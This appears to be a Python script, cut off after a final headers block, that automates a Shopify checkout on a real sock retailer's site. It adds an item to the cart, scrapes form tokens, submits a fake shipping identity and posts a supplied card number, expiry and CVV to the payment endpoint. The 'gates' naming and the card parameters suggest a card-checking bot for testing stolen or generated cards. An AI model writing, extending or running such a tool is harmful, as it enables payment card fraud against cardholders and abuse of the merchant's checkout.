import aiohttp
from tenacity import retry, stop_after_attempt
from urllib.parse import urlparse, quote
import asyncio
import random
import requests
import time
import string
from aiohttp_socks.connector import ProxyConnector
from gates.functions.func_imp import find_between,get_random_string

def find_between( data, first, last ):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None

@retry(stop=stop_after_attempt(3))
async def auto_sho_async(cc,mes,ano,cvv):

 session = requests.session()

 headers = {
    'authority': 'nothingnew.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'secure_customer_sig=; localization=US; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22US%22%2C%22sale_of_data_region%22%3Afalse%7D; _tracking_consent=%7B%22region%22%3A%22VEN%22%2C%22reg%22%3A%22%22%2C%22con%22%3A%7B%22CMP%22%3A%7B%22s%22%3A%22%22%2C%22m%22%3A%22%22%2C%22a%22%3A%22%22%2C%22p%22%3A%22%22%7D%7D%2C%22lim%22%3A%5B%22GDPR%22%5D%2C%22v%22%3A%222.1%22%7D; _y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _s=46cf4f3c-388c-4821-823c-daaade37cede; _shopify_y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _shopify_s=46cf4f3c-388c-4821-823c-daaade37cede; _shopify_tm=; _shopify_tw=; _shopify_m=session; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.624558676.1692022950; _tt_enable_cookie=1; _ttp=VP6crS0L11unzjvZYHSSbIftFcs; _fbp=fb.1.1692022952634.1915081048; _gcl_au=1.1.625525359.1692022958; klaClosedPopup=1; _hp2_ses_props.2707716092=%7B%22ts%22%3A1692022960038%2C%22d%22%3A%22nothingnew.com%22%2C%22h%22%3A%22%2F%22%7D; cjConsent=MHxOfDB8Tnww; cjUser=3db8661c-ad99-48ae-a7fe-dd7f28de5f4a; __zlcmid=1HLm2ttKcP7pjvr; _shopify_sa_t=2023-08-14T14%3A25%3A41.541Z; _ga_H9CDY5YG69=GS1.1.1692022952.1.1.1692023141.58.0.0; keep_alive=dd487ff3-8096-47b9-bdb2-1e3c40a4595a; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTIwMjM0NTUsInZhbHVlIjoiaHR0cHM6Ly9ub3RoaW5nbmV3LmNvbS9jb2xsZWN0aW9ucy9tZW5zLXNuZWFrZXJzIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vcHJvZHVjdHMvbWVucy1uby1zaG93LXNvY2tzLXdoaXRlIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyMDIzNDU1LCJ2YWx1ZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vY29sbGVjdGlvbnMvbWVucy1zbmVha2VycyIsImZpcnN0X3BhZ2UiOiJodHRwczovL25vdGhpbmduZXcuY29tL3Byb2R1Y3RzL21lbnMtbm8tc2hvdy1zb2Nrcy13aGl0ZSJ9fQ==; _ga=GA1.2.48992923.1692022950; _hp2_id.2707716092=%7B%22userId%22%3A%225779111018592285%22%2C%22pageviewId%22%3A%224086185758523820%22%2C%22sessionId%22%3A%223023259555230430%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM4NDE4NDEiLCJhcCI6IjU5NDQwMzMyMyIsImlkIjoiM2JkNDZlNDBiZGVmZTVlMiIsInRyIjoiOGE2NWYzYjczNjhiMmRmOTZmMjYxM2VmNGFlODVjNTAiLCJ0aSI6MTY5MjAyMzUxOTA4OH19',
    'origin': 'https://nothingnew.com',
    'referer': 'https://nothingnew.com/products/mens-no-show-socks-white',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-8a65f3b7368b2df96f2613ef4ae85c50-3bd46e40bdefe5e2-01',
    'tracestate': '3841841@nr=0-1-3841841-594403323-3bd46e40bdefe5e2----1692023519088',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    'x-newrelic-id': 'undefined',
    'x-requested-with': 'XMLHttpRequest',
}

 data = {
    'form_type': 'product',
    'utf8': '✓',
    'id': '40710853328989',
    'quantity': '1',
}
 req1 = session.post('https://nothingnew.com/cart/add.js',  headers=headers, data=data)
 
 req2 = session.get('https://nothingnew.com/checkout')
    
 url = req2.url

 req3 = session.get(url=url)

 texto_1 = req3.text

 token_1 = find_between(texto_1,'input type="hidden" name="authenticity_token" value="','"')

 headers_2 = {
    'authority': 'nothingnew.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUyTURnNE5qVTJNRFExWkRNMVpqWTVZMlV6WlRkaVpXUTVNR1UwWVdJME5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0wNFQxNDozNDoyNy4yMzBaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--5e131532fc54e2132f6e7644ae7bf51b29ec428f; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUyTURnNE5qVTJNRFExWkRNMVpqWTVZMlV6WlRkaVpXUTVNR1UwWVdJME5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0wNFQxNDozNDoyNy4yMzBaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--7d40640c78a8e7d2509f17e8f4a5880205a697e3; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0xNFQxNDozNDoyNy4yMzBaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--cdead44181b3376106fbeb1885e7f798567d2108; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0xNFQxNDozNDoyNy4yMzBaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--a7a8ed68ef3666e91d3aba539b28cfa9eaace3f7; tracked_start_checkout=1cb5d1460b5cfadd9c196c0b8bfdd31c; secure_customer_sig=; localization=US; _tracking_consent=%7B%22region%22%3A%22VEN%22%2C%22reg%22%3A%22%22%2C%22con%22%3A%7B%22CMP%22%3A%7B%22s%22%3A%22%22%2C%22m%22%3A%22%22%2C%22a%22%3A%22%22%2C%22p%22%3A%22%22%7D%7D%2C%22lim%22%3A%5B%22GDPR%22%5D%2C%22v%22%3A%222.1%22%7D; _y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _s=46cf4f3c-388c-4821-823c-daaade37cede; _shopify_y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _shopify_s=46cf4f3c-388c-4821-823c-daaade37cede; _shopify_tm=; _shopify_tw=; _shopify_m=session; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.624558676.1692022950; _tt_enable_cookie=1; _ttp=VP6crS0L11unzjvZYHSSbIftFcs; _fbp=fb.1.1692022952634.1915081048; _gcl_au=1.1.625525359.1692022958; klaClosedPopup=1; _hp2_ses_props.2707716092=%7B%22ts%22%3A1692022960038%2C%22d%22%3A%22nothingnew.com%22%2C%22h%22%3A%22%2F%22%7D; cjConsent=MHxOfDB8Tnww; cjUser=3db8661c-ad99-48ae-a7fe-dd7f28de5f4a; __zlcmid=1HLm2ttKcP7pjvr; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTIwMjM0NTUsInZhbHVlIjoiaHR0cHM6Ly9ub3RoaW5nbmV3LmNvbS9jb2xsZWN0aW9ucy9tZW5zLXNuZWFrZXJzIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vcHJvZHVjdHMvbWVucy1uby1zaG93LXNvY2tzLXdoaXRlIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyMDIzNDU1LCJ2YWx1ZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vY29sbGVjdGlvbnMvbWVucy1zbmVha2VycyIsImZpcnN0X3BhZ2UiOiJodHRwczovL25vdGhpbmduZXcuY29tL3Byb2R1Y3RzL21lbnMtbm8tc2hvdy1zb2Nrcy13aGl0ZSJ9fQ==; cart=3e5c4d5560a038447c195bbbe903889a; cart_sig=e4c62ca18b6d4a6a6ec59fc8ecc5832c; keep_alive=b973a85a-76fa-4e22-9816-15559804cc26; cart_currency=USD; cart_ts=1692023666; _checkout_queue_token=AgypF7AIBHPuBv5a9DpXVOuHRiLYDFnCXbsBy6KalRxXUHm1KX_EifeXkV2hHOcU55DIEuuzAtqERVlh82Z8k_UHvBv6nLP8gsYo8eAUolBCgDXIOaSnl4YS9DE9mLBl7_Fqwd5mZspcZU6eYA5T-NezCpQl1xqw-QIcrZB-7fxoy6yxkOMsJNxi7yly; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyMy0wOC0xNFQxNTozNDoyNi4zNTNaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--6adcd428954337799c9d02cb9b7bc559f5904f3c; cart_ver=gcp-us-east1%3A2; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSNY%22%2C%22sale_of_data_region%22%3Afalse%7D; _secure_session_id=0e07dfe68babcd1b9e9591a024806eb5; _shopify_sa_t=2023-08-14T14%3A34%3A59.920Z; _hp2_id.2707716092=%7B%22userId%22%3A%225779111018592285%22%2C%22pageviewId%22%3A%226391868115546328%22%2C%22sessionId%22%3A%223023259555230430%22%2C%22identity%22%3Anull%2C%22trackerVersion%22%3A%224.0%22%7D; _ga=GA1.2.48992923.1692022950; _gat_UA-140116806-1=1; unique_interaction_id=a26e6e5f-6d3a-4b30-f9cf-563f92553409; _ga_H9CDY5YG69=GS1.1.1692022952.1.1.1692023762.29.0.0',
    'origin': 'https://nothingnew.com',
    'referer': 'https://nothingnew.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}
    
 data_2 = f'_method=patch&authenticity_token={token_1}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=santoagoabavhd09%40gmail.com&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=SANTIAGO&checkout%5Bshipping_address%5D%5Blast_name%5D=ABCHE&checkout%5Bshipping_address%5D%5Baddress1%5D=New+York&checkout%5Bshipping_address%5D%5Baddress2%5D=hause%2C10&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10080&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1384&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240&button='

 req4 = session.post(url=url,headers=headers_2,data=data_2)

 url_2 = req4.url

 req5 = session.get(url=url_2)

 texto_2 = req5.text

 token_2 = find_between(texto_2,'input type="hidden" name="authenticity_token" value="','"')

 headers_3 = {
    'authority': 'nothingnew.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUyTURnNE5qVTJNRFExWkRNMVpqWTVZMlV6WlRkaVpXUTVNR1UwWVdJME5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0wNFQxNDozNjowMy4yMDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--f13b0a8bef73a42305167eb71cbc7c631eb72950; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUyTURnNE5qVTJNRFExWkRNMVpqWTVZMlV6WlRkaVpXUTVNR1UwWVdJME5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0wNFQxNDozNjowMy4yMDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--5252c23690940b424794ad8c44aacc4c1b5cee9a; tracked_start_checkout=1cb5d1460b5cfadd9c196c0b8bfdd31c; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0xNFQxNDozNjowMy4yMDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--1b114c27277c082795187f4957f23b45d5037a74; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0xNFQxNDozNjowMy4yMDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--1ace423ac287ebccde20ccadf33190d5210d801c; secure_customer_sig=; localization=US; _tracking_consent=%7B%22region%22%3A%22VEN%22%2C%22reg%22%3A%22%22%2C%22con%22%3A%7B%22CMP%22%3A%7B%22s%22%3A%22%22%2C%22m%22%3A%22%22%2C%22a%22%3A%22%22%2C%22p%22%3A%22%22%7D%7D%2C%22lim%22%3A%5B%22GDPR%22%5D%2C%22v%22%3A%222.1%22%7D; _y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _s=46cf4f3c-388c-4821-823c-daaade37cede; _shopify_y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _shopify_s=46cf4f3c-388c-4821-823c-daaade37cede; _shopify_tm=; _shopify_tw=; _shopify_m=session; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.624558676.1692022950; _tt_enable_cookie=1; _ttp=VP6crS0L11unzjvZYHSSbIftFcs; _fbp=fb.1.1692022952634.1915081048; _gcl_au=1.1.625525359.1692022958; klaClosedPopup=1; _hp2_ses_props.2707716092=%7B%22ts%22%3A1692022960038%2C%22d%22%3A%22nothingnew.com%22%2C%22h%22%3A%22%2F%22%7D; cjConsent=MHxOfDB8Tnww; cjUser=3db8661c-ad99-48ae-a7fe-dd7f28de5f4a; __zlcmid=1HLm2ttKcP7pjvr; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTIwMjM0NTUsInZhbHVlIjoiaHR0cHM6Ly9ub3RoaW5nbmV3LmNvbS9jb2xsZWN0aW9ucy9tZW5zLXNuZWFrZXJzIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vcHJvZHVjdHMvbWVucy1uby1zaG93LXNvY2tzLXdoaXRlIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyMDIzNDU1LCJ2YWx1ZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vY29sbGVjdGlvbnMvbWVucy1zbmVha2VycyIsImZpcnN0X3BhZ2UiOiJodHRwczovL25vdGhpbmduZXcuY29tL3Byb2R1Y3RzL21lbnMtbm8tc2hvdy1zb2Nrcy13aGl0ZSJ9fQ==; cart=3e5c4d5560a038447c195bbbe903889a; cart_sig=e4c62ca18b6d4a6a6ec59fc8ecc5832c; cart_currency=USD; cart_ts=1692023666; cart_ver=gcp-us-east1%3A2; _secure_session_id=0e07dfe68babcd1b9e9591a024806eb5; _checkout_queue_token=AjWRXox4JufdKlEZaRp0e-ko_IJMktQz5-1DwNggDLF8RE7gGIMMP9ztFGtIIlWQsp4fDoA_JjkUDWSbrqEI_ZCw8pj0wWAbk85QLlEaWpwZvtPsH9UoYRpW9IZRxDWbm6PHgMIYdMS4DxyCYV7RzMMgE1gi-dxuTsdTfXWjFxGm4pU-G3Wpr_ecCoVL; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyMy0wOC0xNFQxNTozNjowMi44MDdaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--0ea4ddbaa57a3d1fd6d7c944dfc09fbd8d552c02; _shopify_sa_t=2023-08-14T14%3A36%3A05.190Z; keep_alive=4766ad74-1c78-4741-af6a-fbfd6d1afad4; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22US%22%2C%22sale_of_data_region%22%3Afalse%7D; _hp2_id.2707716092=%7B%22userId%22%3A%225779111018592285%22%2C%22pageviewId%22%3A%2282640028598084%22%2C%22sessionId%22%3A%223023259555230430%22%2C%22identity%22%3A%22santoagoabavhd09%40gmail.com%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; _ga=GA1.2.48992923.1692022950; unique_interaction_id=84502a23-52d6-4f29-cde6-5bcf8df220b0; _ga_H9CDY5YG69=GS1.1.1692022952.1.1.1692024635.60.0.0',
    'origin': 'https://nothingnew.com',
    'referer': 'https://nothingnew.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}
 data_3 = f'_method=patch&authenticity_token={token_2}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Shipping%2520%283-5%2520business%2520days%29-2.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1399&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240&button='

 req6 = session.post(url=url_2,headers=headers_3,data=data_3)

 url_3 = req6.url

 req7 = session.get(url=url_3)

 texto_3 = req7.text

 token_3 = find_between(texto_3,'input type="hidden" name="authenticity_token" value="','"')

 headers = {
    'Accept': 'application/json',
    'Accept-Language': 'es-ES,es;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://checkout.shopifycs.com',
    'Referer': 'https://checkout.shopifycs.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

 json_data = {
    'credit_card': {
        'number': cc,
        'name': 'sanyu',
        'month': mes,
        'year': ano,
        'verification_value': cvv,
    },
    'payment_session_scope': 'nothingnew.com',
}

 req8 = session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data).json()

 id1 = req8['id']

 headers_4 = {
    'authority': 'nothingnew.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUyTURnNE5qVTJNRFExWkRNMVpqWTVZMlV6WlRkaVpXUTVNR1UwWVdJME5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0wNFQxNDo1NToyMC4xMDhaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--aa16b1f82e1ecc4e2b33e15ab1e8c31b338e2f9a; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUyTURnNE5qVTJNRFExWkRNMVpqWTVZMlV6WlRkaVpXUTVNR1UwWVdJME5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0wNFQxNDo1NToyMC4xMDhaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--5f2c20b1bd760d4d52e9b43905d451da4396712c; tracked_start_checkout=1cb5d1460b5cfadd9c196c0b8bfdd31c; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0xNFQxNDo1NToyMC4xMDhaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--32023e5607c52a36a68713a8be25247495f62470; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0xNFQxNDo1NToyMC4xMDhaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--bf719c34015562cd5ccc6c87d67004797bd9cfaa; secure_customer_sig=; localization=US; _tracking_consent=%7B%22region%22%3A%22VEN%22%2C%22reg%22%3A%22%22%2C%22con%22%3A%7B%22CMP%22%3A%7B%22s%22%3A%22%22%2C%22m%22%3A%22%22%2C%22a%22%3A%22%22%2C%22p%22%3A%22%22%7D%7D%2C%22lim%22%3A%5B%22GDPR%22%5D%2C%22v%22%3A%222.1%22%7D; _y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _shopify_y=e8b81c7e-0ae0-4815-bfd0-ea546e4da131; _shopify_tw=; _shopify_m=session; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.624558676.1692022950; _tt_enable_cookie=1; _ttp=VP6crS0L11unzjvZYHSSbIftFcs; _fbp=fb.1.1692022952634.1915081048; _gcl_au=1.1.625525359.1692022958; klaClosedPopup=1; _hp2_ses_props.2707716092=%7B%22ts%22%3A1692022960038%2C%22d%22%3A%22nothingnew.com%22%2C%22h%22%3A%22%2F%22%7D; cjConsent=MHxOfDB8Tnww; cjUser=3db8661c-ad99-48ae-a7fe-dd7f28de5f4a; __zlcmid=1HLm2ttKcP7pjvr; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTIwMjM0NTUsInZhbHVlIjoiaHR0cHM6Ly9ub3RoaW5nbmV3LmNvbS9jb2xsZWN0aW9ucy9tZW5zLXNuZWFrZXJzIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vcHJvZHVjdHMvbWVucy1uby1zaG93LXNvY2tzLXdoaXRlIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyMDIzNDU1LCJ2YWx1ZSI6Imh0dHBzOi8vbm90aGluZ25ldy5jb20vY29sbGVjdGlvbnMvbWVucy1zbmVha2VycyIsImZpcnN0X3BhZ2UiOiJodHRwczovL25vdGhpbmduZXcuY29tL3Byb2R1Y3RzL21lbnMtbm8tc2hvdy1zb2Nrcy13aGl0ZSJ9fQ==; cart=3e5c4d5560a038447c195bbbe903889a; cart_sig=e4c62ca18b6d4a6a6ec59fc8ecc5832c; cart_currency=USD; cart_ts=1692023666; cart_ver=gcp-us-east1%3A2; _secure_session_id=0e07dfe68babcd1b9e9591a024806eb5; _gat_UA-140116806-1=1; _checkout_queue_token=AlLXvt0SFfm5IOJqFA4o8OOCQjYdslgbrCuA-A2eRfmTYgLkv3d2o0L0f6Ivy9Hef2ZjCCYCg9jNFKewp6sg8Z2PMgA7ldd0kObHEzY4h4SYqkfPAM3Bv6pE8zcnsM-FWU9MBp8sCx0z43queEcVo6iVIpSGPRp-2-5bwF8gkAZl0_VlK_zufB7GtsRu; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVV4WTJJMVpERTBOakJpTldObVlXUmtPV014T1Raak1HSTRZbVprWkRNeFl3WTZCa1ZVIiwiZXhwIjoiMjAyMy0wOC0xNFQxNTo1NToxNS40NTlaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--e4510f240f9d5d8e6ecd80030ab215e29978a619; _shopify_tm=; _s=d0f4bc19-ae30-4f3c-8a76-337d799f2340; _shopify_s=d0f4bc19-ae30-4f3c-8a76-337d799f2340; _gat=1; _shopify_sa_t=2023-08-14T14%3A55%3A22.518Z; _hp2_id.2707716092=%7B%22userId%22%3A%225779111018592285%22%2C%22pageviewId%22%3A%224759817534802943%22%2C%22sessionId%22%3A%223023259555230430%22%2C%22identity%22%3A%22santoagoabavhd09%40gmail.com%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D; keep_alive=0734f0ca-0751-4c93-b4d3-1b8d86614225; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22US%22%2C%22sale_of_data_region%22%3Afalse%7D; _ga=GA1.2.48992923.1692022950; unique_interaction_id=7fca43da-d8ee-4bcb-1201-54944a5af0b4; _ga_H9CDY5YG69=GS1.1.1692022952.1.1.1692024950.23.0.0',
    'origin': 'https://nothingnew.com',
    'referer': 'https://nothingnew.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}
